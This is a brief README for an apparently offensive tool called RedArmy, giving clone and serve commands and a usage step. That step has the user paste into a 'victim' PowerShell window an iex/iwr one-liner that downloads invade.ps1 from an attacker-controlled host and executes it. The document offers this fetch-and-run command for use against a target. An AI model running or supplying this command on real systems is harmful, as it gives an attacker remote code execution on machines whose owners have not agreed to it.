# RedArmy

## Installation

```
$ git clone https://gitlab.com/mjwhitta/redarmy.git
$ cd ./redarmy
$ git submodule update --init --recursive
$ ./serve [--port PORT] [--update] <ip>
```

## Usage

Once the `serve` script is running, you can copy and paste the output
into the victim powershell window.

```
iex (iwr -DisableKeepAlive -UseBasicParsing http://<ip>:<port>/invade.ps1)
```
